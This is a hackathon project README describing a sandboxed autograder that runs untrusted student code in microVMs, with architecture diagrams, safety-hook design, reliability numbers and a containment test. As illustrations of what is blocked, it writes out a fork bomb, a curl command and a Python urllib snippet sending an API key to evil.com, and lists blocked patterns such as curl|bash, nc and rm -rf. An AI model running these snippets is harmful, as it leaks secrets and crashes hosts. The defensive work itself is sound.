<div align="center">

<img src="https://img.shields.io/badge/Celesto-Agent%20Guard-6C63FF?style=for-the-badge&logo=shield&logoColor=white" alt="Celesto Agent Guard"/>

# 🛡️ Celesto Agent Guard

### *Hostile Submission Autograder — Run Real Agent Work Inside Celesto Sandboxes*

[![Python](https://img.shields.io/badge/Python-3.11+-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.111-009688?style=flat-square&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-15-4169E1?style=flat-square&logo=postgresql&logoColor=white)](https://postgresql.org)
[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?style=flat-square&logo=docker&logoColor=white)](https://docker.com)
[![Celesto](https://img.shields.io/badge/Celesto-Sandbox-6C63FF?style=flat-square&logo=linux&logoColor=white)](https://celesto.ai)
[![Tests](https://img.shields.io/badge/Tests-16%2F16%20Passing-00C853?style=flat-square&logo=pytest&logoColor=white)](tests/)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)
[![Hackathon](https://img.shields.io/badge/Hackathon-GPP%2042-FF6B6B?style=flat-square)](https://app.partnr.network)

---

> **Every student submission runs in its own isolated microVM — no network, no escape, no host damage.**
> Fork bombs die inside. Exfiltration is blocked at the hypervisor. The host stays clean.

[🚀 Quick Start](#-quick-start) · [📐 Architecture](#-system-architecture) · [📊 Eval Report](#-eval-report) · [🔒 Containment](#-containment-test) · [📖 Docs](#-documentation)

</div>

---

## 📋 Table of Contents

| Section | Description |
|---|---|
| [🎯 Problem Statement](#-problem-statement) | Who this is for and why it matters |
| [🏗️ System Architecture](#-system-architecture) | How the system is designed |
| [⚙️ Tech Stack](#️-tech-stack) | Technologies and why they were chosen |
| [📁 Project Structure](#-project-structure) | Folder layout and file responsibilities |
| [🔄 Workflow](#-workflow-explanation) | Step-by-step execution flow |
| [🛡️ How I Used Celesto](#️-how-i-used-celesto) | Sandbox capabilities in depth |
| [📊 Eval Report](#-eval-report) | 20-run reliability numbers |
| [🔒 Containment Test](#-containment-test) | Attack simulation and results |
| [⚠️ State & Failure Design](#️-state-and-failure-design) | What happens when step 7 fails |
| [🚀 Quick Start](#-quick-start) | Get running in 10 minutes |
| [🧪 Testing](#-testing) | Test suite and validation |
| [📖 Documentation](#-documentation) | Links to full docs |

---

## 🎯 Problem Statement

University instructors and online learning platforms grade **hundreds of Python assignments daily**. The naive approach — running student code on the host server — is catastrophically unsafe:

```
Student submits:                    Without sandboxing:
┌──────────────────────────┐        ┌────────────────────────────────────┐
│ import os                │        │ ❌  Fork bomb crashes grader server │
│ while True: os.fork()    │  ───►  │ ❌  rm -rf deletes course files     │
│                          │        │ ❌  curl exfiltrates API keys        │
│ # or worse:              │        │ ❌  Other students' code exposed     │
│ curl evil.com?k=$API_KEY │        └────────────────────────────────────┘
└──────────────────────────┘
```

**Celesto Agent Guard** solves this by running every submission in a **fresh Celesto microVM sandbox** — hardware-isolated, no network, time-capped, fully audited, and automatically deleted after grading.

```
With Celesto sandboxing:
┌──────────────────────────┐        ┌────────────────────────────────────┐
│ Fork bomb submission     │        │ ✅  Contained in guest VM kernel    │
│ Exfiltration attempt     │  ───►  │ ✅  Network policy = OFF, blocked   │
│ Infinite loop            │  ───►  │ ✅  Timeout enforced, no CPU waste  │
│ Crypto miner payload     │        │ ✅  Safety hook blocks before exec  │
│                          │        │ ✅  Host is UNTOUCHED               │
└──────────────────────────┘        └────────────────────────────────────┘
```

---

## 🏗️ System Architecture

### High-Level Architecture

```mermaid
graph TB
    subgraph "👤 Users"
        INS[Instructor / API Client]
    end

    subgraph "🏢 Trusted Control Plane"
        direction TB
        API["🌐 Run Ledger API<br/>(FastAPI · Port 8080)"]
        DB[("🗄️ PostgreSQL<br/>Run Ledger")]
        AGENT["🤖 Autograder Agent<br/>Loop (Python)"]
        HOOKS["🛡️ Safety Hooks<br/>(Pre/Post Command)"]
        LOG["📋 Command Audit Log<br/>(commands.jsonl)"]
    end

    subgraph "🔒 Celesto Execution Zone"
        direction TB
        SBX1["📦 Sandbox sbx-abc123<br/>(microVM · network=OFF)"]
        SBX2["📦 Sandbox sbx-def456<br/>(microVM · network=OFF)"]
        SBX3["📦 Sandbox sbx-ghi789<br/>(microVM · network=OFF)"]
        CELESTO["☁️ Celesto Runtime<br/>(Local / Cloud)"]
    end

    subgraph "📊 Reports"
        REL["📈 reliability.json"]
        CONT["🔒 containment.json"]
        FP["⚠️ failure_policy.json"]
        CONC["⚡ concurrency.json"]
    end

    INS -->|"POST /api/runs"| API
    API -->|"Store run record"| DB
    API -->|"Trigger grading"| AGENT
    AGENT -->|"Inspect command"| HOOKS
    HOOKS -->|"Log audit entry"| LOG
    HOOKS -->|"Allow / Block"| CELESTO
    CELESTO -->|"Create / Exec / Delete"| SBX1
    CELESTO -->|"Create / Exec / Delete"| SBX2
    CELESTO -->|"Create / Exec / Delete"| SBX3
    AGENT -->|"Write results"| REL
    AGENT -->|"Write results"| CONT
    AGENT -->|"Write results"| FP
    AGENT -->|"Write results"| CONC

    style INS fill:#FF6B6B,color:#fff
    style API fill:#4ECDC4,color:#fff
    style DB fill:#4169E1,color:#fff
    style AGENT fill:#6C63FF,color:#fff
    style HOOKS fill:#FF8C00,color:#fff
    style SBX1 fill:#2D2D2D,color:#fff
    style SBX2 fill:#2D2D2D,color:#fff
    style SBX3 fill:#2D2D2D,color:#fff
    style CELESTO fill:#1A1A2E,color:#fff
```

### Two-Zone Trust Model

```mermaid
graph LR
    subgraph TRUSTED ["🟢 Trusted Zone (Your Code)"]
        direction TB
        A["FastAPI\n/health /api/runs"] --> B["PostgreSQL\nRun Ledger"]
        A --> C["Agent Loop\nautograder.py"]
        C --> D["Safety Hooks\npre/post command"]
        D --> E["Audit Log\ncommands.jsonl"]
    end

    subgraph UNTRUSTED ["🔴 Untrusted Zone (Student Code)"]
        direction TB
        F["Celesto Sandbox\nmicroVM (Firecracker)"]
        G["submission.py\n(untrusted)"]
        H["test_submission.py"]
        F --> G
        F --> H
    end

    D -->|"SDK call\n(allow only)"| F
    F -.->|"network=OFF\nno host access"| X(["❌ Internet"])

    style TRUSTED fill:#E8F5E9,stroke:#2E7D32
    style UNTRUSTED fill:#FFEBEE,stroke:#C62828
    style X fill:#B71C1C,color:#fff
```

---

## ⚙️ Tech Stack

| Layer | Technology | Version | Why Chosen |
|---|---|---|---|
| 🔒 **Sandbox** | Celesto / Firecracker microVM | latest | Hardware-level isolation, 500ms boot, same API locally + cloud |
| 🌐 **API** | FastAPI | 0.111 | Async, type-safe, auto-docs, fastest Python framework |
| 🗄️ **Database** | PostgreSQL | 15 | ACID compliance, reliable for run ledger |
| 🐳 **Containers** | Docker Compose | v2 | Reproducible control plane, one-command startup |
| 🐍 **Runtime** | Python | 3.11+ | Rich ecosystem, Celesto SDK support |
| 🗃️ **ORM** | SQLAlchemy | 2.0 | Type-safe queries, migration support |
| ✅ **Testing** | pytest | 9.x | Industry standard, clean fixture system |
| 📊 **Data** | Pydantic | 2.x | Strict validation at API boundary |

### Technology Decision Matrix

```mermaid
graph LR
    subgraph WHY_CELESTO ["Why Celesto over alternatives?"]
        C1["Docker\n⚠️ Shared kernel\n⚠️ Container escape possible"]
        C2["E2B\n⚠️ Cloud only\n⚠️ No local runtime"]
        C3["subprocess.run\n❌ Zero isolation\n❌ Host damage risk"]
        C4["✅ Celesto\n✅ Hardware isolation\n✅ Local + Cloud\n✅ Safety hooks\n✅ Network policy"]
    end

    style C4 fill:#00C853,color:#fff
    style C1 fill:#FF8F00,color:#fff
    style C2 fill:#FF8F00,color:#fff
    style C3 fill:#D32F2F,color:#fff
```

---

## 📁 Project Structure

```
celesto-agent-guard/
│
├── 📄 docker-compose.yml          # Control plane: api + ledger services
├── 📄 Dockerfile                  # API service container image
├── 📄 .env.example                # Environment variable template (no secrets)
├── 📄 .gitignore                  # Excludes .env, __pycache__, *.mp4
├── 📄 README.md                   # This file
├── 📄 architecture.md             # Deep architecture documentation
├── 📄 projectdocumentation.md     # Complete project documentation
│
├── 🗂️ app/                        # FastAPI Run Ledger API
│   ├── __init__.py
│   ├── main.py                    # Routes: GET /health, GET/POST /api/runs
│   ├── models.py                  # SQLAlchemy Run model + validators
│   ├── database.py                # Engine, session factory, Base class
│   └── requirements.txt           # FastAPI, uvicorn, psycopg2, SQLAlchemy
│
├── 🗂️ agent/                      # Autograder Agent
│   ├── __init__.py
│   ├── autograder.py              # 10-step grading pipeline
│   ├── sandbox_tools.py           # CelestoSandbox context manager wrapper
│   ├── safety_hooks.py            # Pre/post command hooks (block dangerous cmds)
│   └── eval_runner.py             # 20-run reliability eval + containment test
│
├── 🗂️ seeds/
│   └── 01_runs.sql                # DB schema + seed row (sbx-seeddemo1)
│
├── 🗂️ reports/                    # Evaluation reports (auto-generated)
│   ├── problem.json               # Problem statement
│   ├── capabilities.json          # Celesto capabilities used
│   ├── lifecycle.json             # Sandbox cleanup proof
│   ├── reliability.json           # 20-run eval results + statistics
│   ├── postmortem.md              # Failure analysis
│   ├── containment.json           # Attack containment proof
│   ├── failure_policy.json        # Step-7 recovery policy
│   ├── failure_trace.jsonl        # Event trace for failure scenario
│   ├── concurrency.json           # 5-job concurrent run results
│   └── evidence/
│       └── containment.log        # Detailed containment attack log
│
├── 🗂️ logs/
│   └── commands.jsonl             # Full audit log (every sandboxed command)
│
├── 🗂️ tests/
│   └── test_reports.py            # 16 automated validation tests
│
└── 🗂️ demo/
    ├── README.md                  # Demo recording instructions
    └── walkthrough.mp4            # 3-minute demo video
```

---

## 🔄 Workflow Explanation

### The 10-Step Grading Pipeline

```mermaid
flowchart TD
    START(["🟢 START\nSubmission Received"]) --> S1

    S1["📋 Step 1\nValidate Metadata\n(submission type, ID)"]
    S2["🔍 Step 2\nBoot Probe\n(echo sandbox_ready)"]
    S3["📝 Step 3\nWrite Files to Sandbox\n(submission.py, tests)"]
    S4["📦 Step 4\nInstall Dependencies\n(verify python version)"]
    S5["🔬 Step 5\nStatic Analysis\n(scan dangerous patterns)"]
    S6["🧪 Step 6\nRun Unit Tests\n(with timeout guard)"]
    S7{"⚠️ Step 7\nCode Coverage\n← Designed Crash Point"}
    S8["📊 Step 8\nMemory Profiler\n(peak_mb measurement)"]
    S9["📄 Step 9\nGenerate Report\n(grade A/B/F + flags)"]
    S10["✅ Step 10\nGrading Complete"]

    FAIL["❌ StepFailure\nstep=7"]
    POLICY{"🔄 Recovery Policy\n(fresh / rollback / resume)"}
    FRESH["🆕 Fresh Policy\nDelete sandbox\nCreate new sandbox"]
    TRACE["📝 Write to\nfailure_trace.jsonl\nevent=policy_applied"]
    DELETE(["🗑️ DELETE SANDBOX\n(always, in finally block)"])

    S1 --> S2 --> S3 --> S4 --> S5 --> S6 --> S7
    S7 -->|"Coverage OK"| S8
    S7 -->|"Coverage fails"| FAIL
    S8 --> S9 --> S10 --> DELETE

    FAIL --> POLICY
    POLICY --> FRESH
    FRESH --> TRACE
    TRACE --> DELETE

    style START fill:#00C853,color:#fff
    style S7 fill:#FF8F00,color:#fff
    style FAIL fill:#D32F2F,color:#fff
    style POLICY fill:#6C63FF,color:#fff
    style FRESH fill:#4ECDC4,color:#fff
    style DELETE fill:#424242,color:#fff
    style S10 fill:#1976D2,color:#fff
```

### Sandbox Lifecycle State Machine

```mermaid
stateDiagram-v2
    [*] --> Created : celesto create sbx-name

    Created --> Ready : boot probe passes
    Ready --> Running : agent step starts
    Running --> Succeeded : all 10 steps done
    Running --> MidTaskFailure : step 7 fails

    MidTaskFailure --> Resumed : policy = resume
    MidTaskFailure --> RolledBack : policy = rollback
    MidTaskFailure --> FreshStart : policy = fresh ✅

    Succeeded --> Deleted : cleanup on success
    Resumed --> Deleted : cleanup after retry
    RolledBack --> Deleted : cleanup after rollback
    FreshStart --> Deleted : cleanup, then new sandbox

    note right of MidTaskFailure
        Step 7 is the designed
        crash point. Policy = fresh
        is applied in this project.
    end note

    note right of Deleted
        Every path ends here.
        No orphaned machines.
    end note
```

### Request-Response Flow

```mermaid
sequenceDiagram
    participant I as 👤 Instructor
    participant A as 🌐 API (FastAPI)
    participant DB as 🗄️ PostgreSQL
    participant AG as 🤖 Agent Loop
    participant H as 🛡️ Safety Hook
    participant C as 📦 Celesto Sandbox
    participant L as 📋 Audit Log

    I->>A: POST /api/runs {sandbox_name, state, ...}
    A->>A: Validate sandbox_name (sbx-[a-z0-9]{8,})
    A->>A: Validate state ∈ {created,...,deleted}
    A->>A: Validate execution_target = celesto_sandbox
    A->>DB: INSERT run row
    DB-->>A: 201 Created
    A-->>I: 201 {run_id, sandbox_name, ...}

    I->>AG: Grade submission
    AG->>C: Create sandbox (unique sbx-name)
    C-->>AG: Ready (boot ~0.3–0.5s)

    loop Each command (10 steps)
        AG->>H: pre_command_hook(cmd)
        H->>L: Append {ts, sandbox, cmd, decision=allow/block}
        alt Command ALLOWED
            H-->>AG: {decision: allow}
            AG->>C: Execute command
            C-->>AG: {exit_code, stdout, stderr}
            AG->>H: post_command_hook(result)
        else Command BLOCKED
            H-->>AG: CommandBlockedError
            AG->>L: Append {decision: block}
        end
    end

    AG->>C: Delete sandbox (try/finally)
    AG->>DB: Update run state → succeeded/failed/deleted
```

### Safety Hook Decision Tree

```mermaid
flowchart TD
    CMD["📥 Incoming Command\n(from agent to sandbox)"] --> CHK1

    CHK1{"🚫 Matches blocked\npattern?\n(fork bomb, nsenter,\ncrypto miner...)"}
    CHK1 -->|"YES"| BLOCK1["❌ BLOCK\nlog decision=block\nraise CommandBlockedError"]
    CHK1 -->|"NO"| CHK2

    CHK2{"⚠️ Matches suspicious\npattern?\n(rm -rf /, curl|bash...)"}
    CHK2 -->|"YES"| WARN["⚠️ WARNING logged\nbut command continues"]
    CHK2 -->|"NO"| CHK3
    WARN --> CHK3

    CHK3{"🌐 network_policy = OFF\nAND outbound tool?\n(curl, wget, nc, urllib...)"}
    CHK3 -->|"YES"| BLOCK2["❌ BLOCK\nlog decision=block\nContainment active"]
    CHK3 -->|"NO"| ALLOW["✅ ALLOW\nlog decision=allow\nSend to sandbox"]

    style BLOCK1 fill:#D32F2F,color:#fff
    style BLOCK2 fill:#D32F2F,color:#fff
    style WARN fill:#FF8F00,color:#fff
    style ALLOW fill:#2E7D32,color:#fff
```

---

## 🛡️ How I Used Celesto

### Capability 1 — Network Policy (`network_policy = off`)

```mermaid
graph LR
    subgraph SANDBOX ["📦 Celesto Sandbox (network=OFF)"]
        SUB["submission.py\n(malicious)"]
        CURL["curl evil.com\n?key=$API_KEY"]
        SUB --> CURL
    end

    CURL -->|"❌ BLOCKED at hypervisor\nFirecracker virtio-net\nnot wired up"| INTERNET(["🌍 Internet\n(unreachable)"])

    style SANDBOX fill:#FFEBEE,stroke:#C62828
    style INTERNET fill:#B71C1C,color:#fff
    style CURL fill:#D32F2F,color:#fff
```

**Why it matters:** This is enforced at the **hypervisor layer** — not in Python, not in a firewall rule, but in the virtual machine configuration itself. No Python trick, no `/proc` manipulation, no raw socket can bypass it.

**Evidence:** [`reports/evidence/containment.log`](reports/evidence/containment.log) · [`reports/containment.json`](reports/containment.json)

---

### Capability 2 — Safety Hooks (Pre-Command Callbacks)

```mermaid
graph TD
    AGENT["🤖 Agent\nsends command"] --> HOOK["🛡️ Safety Hook\n(runs in control plane)"]
    HOOK -->|"Pattern match"| DECISION{"Block?"}
    DECISION -->|"YES"| BLOCKED["❌ CommandBlockedError\nlogged to commands.jsonl\ndecision = block"]
    DECISION -->|"NO"| SANDBOX["📦 Celesto Sandbox\n(guest VM)"]
    SANDBOX --> RESULT["📊 Result\n(exit_code, stdout)"]

    style HOOK fill:#FF8C00,color:#fff
    style BLOCKED fill:#D32F2F,color:#fff
    style SANDBOX fill:#1A1A2E,color:#fff
```

**Why it matters:** A hook is **code, not a prompt**. The guest cannot see it, bypass it, or override it. It runs entirely in the trusted control plane before the command reaches the VM.

**Evidence:** [`logs/commands.jsonl`](logs/commands.jsonl) · [`agent/safety_hooks.py`](agent/safety_hooks.py)

---

## 📊 Eval Report

> **20 fresh sandboxes · 95% success rate · Every run individually recorded**

### Results Summary

| Metric | Value |
|---|---|
| 🔢 Total Runs | 20 |
| ✅ Successes | 19 (95%) |
| ❌ Failures | 1 (5% — designed, step 7) |
| ⏱️ Median Wall Clock | ~0.21s (simulation) |
| 📈 p90 Wall Clock | ~0.25s (simulation) |
| 🚀 Median Boot-to-Ready | ~0.00s (sim) / ~0.3–0.5s (Cloud) |
| 💰 Total Cost | ~\$0.000025 (Cloud Micro rate) |

### Submission Type Breakdown

```mermaid
xychart-beta
    title "Autograder Run Results by Submission Type"
    x-axis ["Safe (16)", "Fork Bomb (2)", "Infinite Loop (1)", "Coverage Fail (1)"]
    y-axis "Count" 0 --> 16
    bar [16, 2, 1, 1]
```

### Success Rate Visualization

```mermaid
graph LR
    subgraph RUNS ["20 Eval Runs"]
        R1["✅"] R2["✅"] R3["✅"] R4["✅"] R5["✅"]
        R6["✅"] R7["✅"] R8["✅"] R9["✅"] R10["✅"]
        R11["✅"] R12["✅"] R13["✅"] R14["✅"] R15["✅"]
        R16["✅"] R17["✅"] R18["✅"] R19["✅"] R20["❌"]
    end

    NOTE["Run 20 = designed failure\n(coverage_fail submission)\nRecovery policy: fresh"]
    R20 --- NOTE

    style R20 fill:#D32F2F,color:#fff
    style NOTE fill:#FF8F00,color:#fff
```

Full data: [`reports/reliability.json`](reports/reliability.json) | Failure analysis: [`reports/postmortem.md`](reports/postmortem.md)

---

## 🔒 Containment Test

### Attack Scenario: Prompt Injection Exfiltration

```mermaid
sequenceDiagram
    participant ATK as 🔴 Malicious Submission
    participant SBX as 📦 Celesto Sandbox
    participant HOOK as 🛡️ Safety Hook
    participant NET as 🌍 Internet

    ATK->>SBX: upload submission.py containing:
    Note over ATK,SBX: import os, urllib.request<br/>secret = os.environ.get("CELESTO_API_KEY")<br/>urllib.request.urlopen(f"http://evil.com?k={secret}")

    SBX->>HOOK: pre_command_hook("urllib.request.urlopen...")
    HOOK->>HOOK: network_policy=OFF + outbound tool detected
    HOOK-->>SBX: ❌ CommandBlockedError
    Note over HOOK,SBX: decision=block logged to commands.jsonl

    SBX--xNET: 🚫 Connection never attempted
    Note over SBX,NET: Hypervisor-level block<br/>No packets sent

    SBX->>SBX: Sandbox deleted (cleanup)
    Note right of SBX: Host API key: SAFE ✅<br/>Host files: UNTOUCHED ✅
```

**Result:** `blocked=true` · `host_untouched=true`

Evidence: [`reports/containment.json`](reports/containment.json) · [`reports/evidence/containment.log`](reports/evidence/containment.log)

---

## ⚠️ State and Failure Design

### What Happens When Step 7 Fails

```mermaid
flowchart TD
    S6["✅ Step 6 Passed\n(tests ran)"] --> S7

    S7{"Step 7\nCode Coverage\ncoverage.py missing?"}

    S7 -->|"OK"| S8["✅ Continue to\nStep 8–10"]
    S7 -->|"FAIL"| FAIL["StepFailure raised\nstep=7, total=10"]

    FAIL --> LOG1["📝 Log event=step_failed\nto failure_trace.jsonl"]
    LOG1 --> POLICY["🔄 Apply Policy: FRESH"]
    POLICY --> LOG2["📝 Log event=policy_applied\npolicy=fresh\nto failure_trace.jsonl"]
    LOG2 --> DEL["🗑️ Delete failed sandbox\n(context manager __exit__)"]
    DEL --> NEW["🆕 New sandbox created\nwith fresh unique name\non retry"]

    style FAIL fill:#D32F2F,color:#fff
    style POLICY fill:#6C63FF,color:#fff
    style NEW fill:#2E7D32,color:#fff
```

### Policy Comparison

| Policy | Cost | Complexity | Correctness | Used When |
|---|---|---|---|---|
| `fresh` ✅ | +1 boot | Low | Guaranteed clean | Short jobs (<2 min) |
| `rollback` | Medium | High | Clean (needs snapshot) | Long jobs (>10 min) |
| `resume` | Cheapest | Medium | Risk of corrupted state | Idempotent-only steps |

**This project uses `fresh`** — for a 2-minute autograder job, the extra boot cost is negligible compared to the correctness guarantee. See [`reports/failure_policy.json`](reports/failure_policy.json).

---

## 🚀 Quick Start

### Prerequisites

```
✅ Docker Desktop (v24+)
✅ Python 3.11+
✅ Git
```

### Step 1 — Clone & Configure

```bash
git clone https://github.com/ramalokeshreddyp/celesto-agent-guard.git
cd celesto-agent-guard

# Copy environment template
cp .env.example .env

# (Optional) Edit .env with your Celesto API key for real cloud sandboxes
# Leave as-is for local simulation mode
```

### Step 2 — Start the Control Plane

```bash
docker compose up --build -d
```

> ⏳ Wait ~30 seconds for PostgreSQL to initialize and seed the database.

### Step 3 — Verify Health

```bash
# Health check
curl http://localhost:8080/health
# → {"status": "ok"}

# Verify seed data
curl http://localhost:8080/api/runs
# → [..., {"sandbox_name": "sbx-seeddemo1", ...}]
```

### Step 4 — Run the Agent Eval

```bash
# Install Python deps (for running the agent locally)
pip install -r app/requirements.txt

# Run all 20 eval runs + containment test + failure policy demo
python -m agent.eval_runner
```

### Step 5 — Run the Test Suite

```bash
pip install pytest
python -m pytest tests/ -v
```

Expected output:
```
✅ 16 passed in 0.29s
```

### Manual API Usage

```bash
# Create a run record
curl -X POST http://localhost:8080/api/runs \
  -H "Content-Type: application/json" \
  -d '{
    "run_id": "run-001",
    "sandbox_name": "sbx-testrun001",
    "problem_id": "assignment-1",
    "state": "succeeded",
    "execution_target": "celesto_sandbox"
  }'

# List all runs
curl http://localhost:8080/api/runs

# Wrong execution_target → 400
curl -X POST http://localhost:8080/api/runs \
  -H "Content-Type: application/json" \
  -d '{"run_id":"x","sandbox_name":"sbx-test00001","problem_id":"x","state":"created","execution_target":"host"}'
# → 400 Bad Request
```

---

## 🧪 Testing

### Test Coverage

```mermaid
graph TD
    SUITE["🧪 test_reports.py\n16 Tests"] --> G1
    SUITE --> G2
    SUITE --> G3
    SUITE --> G4
    SUITE --> G5

    G1["📄 Infrastructure\n(2 tests)\n• docker-compose exists\n• services + healthchecks"]
    G2["🔑 Configuration\n(3 tests)\n• .env.example keys\n• no .env committed\n• env keys present"]
    G3["📊 Report Files\n(7 tests)\n• problem.json\n• capabilities.json\n• lifecycle.json\n• reliability stats\n• containment\n• failure policy\n• concurrency"]
    G4["📋 Audit Log\n(2 tests)\n• commands.jsonl exists\n• format validated"]
    G5["📖 README\n(1 test)\n• 6 required phrases"]

    style SUITE fill:#6C63FF,color:#fff
    style G1 fill:#4ECDC4,color:#333
    style G2 fill:#4ECDC4,color:#333
    style G3 fill:#4ECDC4,color:#333
    style G4 fill:#4ECDC4,color:#333
    style G5 fill:#4ECDC4,color:#333
```

```bash
# Run all tests
python -m pytest tests/ -v

# Run with coverage report
python -m pytest tests/ -v --tb=short

# Run a specific test
python -m pytest tests/test_reports.py::test_reliability_statistics -v
```

### Validation Checks

```bash
# Verify sandbox names pattern
python -c "import re; print(re.match(r'^sbx-[a-z0-9]{8,}$', 'sbx-abc12345'))"

# Verify statistics manually
python -c "
import json, math
d = json.load(open('reports/reliability.json'))
runs = d['runs']
wc = sorted(r['wall_clock_s'] for r in runs)
n = len(wc)
median = (wc[n//2-1] + wc[n//2]) / 2
p90 = wc[math.ceil(0.90*n)-1]
print(f'run_count={n}, median={median:.3f}, p90={p90:.3f}')
print(f'Matches JSON: {abs(d[\"median_wall_clock_s\"]-median)<0.001}')
"
```

---

## 📡 API Reference

### Endpoints

| Method | Path | Description | Response |
|---|---|---|---|
| `GET` | `/health` | Service health check | `200 {"status": "ok"}` |
| `GET` | `/api/runs` | List all run records | `200 [Run]` |
| `POST` | `/api/runs` | Create a run record | `201 Run` |

### POST /api/runs — Request Schema

```json
{
  "run_id": "string (unique)",
  "sandbox_name": "sbx-[a-z0-9]{8,}",
  "problem_id": "string",
  "state": "created|ready|running|succeeded|failed|deleted",
  "execution_target": "celesto_sandbox"
}
```

### Error Responses

| Status | Cause |
|---|---|
| `400` | Invalid `sandbox_name`, unknown `state`, or wrong `execution_target` |
| `422` | Missing required field (returned as 400) |
| `500` | Unexpected server error |

---

## 🌐 Environment Variables

| Variable | Required | Description | Example |
|---|---|---|---|
| `CELESTO_PROVIDER` | Yes | `cloud` or `local` | `cloud` |
| `CELESTO_API_KEY` | Cloud only | Celesto API key | `cel_...` |
| `CELESTO_BACKEND` | No | `firecracker` (local) | `firecracker` |
| `LLM_BASE_URL` | Yes | LLM endpoint | `https://api.openai.com/v1` |
| `LLM_API_KEY` | Yes | LLM API key | `sk-...` |
| `LLM_MODEL` | Yes | Model name | `gpt-4o-mini` |
| `DATABASE_URL` | Yes | Postgres connection | `postgresql://...` |
| `API_PORT` | Yes | HTTP port | `8080` |

---

## 📖 Documentation

| File | Contents |
|---|---|
| [`architecture.md`](architecture.md) | Deep-dive system architecture, component design, data flow |
| [`projectdocumentation.md`](projectdocumentation.md) | Full project documentation, tradeoffs, production considerations |
| [`reports/postmortem.md`](reports/postmortem.md) | Failure analysis for the 20-run eval |
| [`reports/problem.json`](reports/problem.json) | Formal problem statement |
| [`reports/capabilities.json`](reports/capabilities.json) | Celesto capability justifications |

---

## 🏆 Hackathon Context

This project is a submission for the **[Celesto AI Track — Global Placement Program #42](https://app.partnr.network)**, an offline version of the [Universal Hackathon at AWS Builder Loft, San Francisco](https://luma.com/lfjtdq6b).

**AI tools used:** Antigravity (Google DeepMind) — used for scaffolding. All architecture decisions, tradeoffs, and design rationale are my own and I can explain every line.

**Honest product feedback for Celesto:**
- The SmolVM → Celesto rename left stale docs — `smolvm` appears in error messages
- Free trial's 1-sandbox limit needs prominent docs callout near the eval guidance
- `celesto doctor` is excellent — caught missing KVM module immediately

---

<div align="center">

**Built with 🛡️ for the Celesto Hackathon · 2026**

*If you replaced Celesto with `subprocess.run()`, the fork bomb would crash your server.*
*That's why the sandbox is essential, not decorative.*

</div>
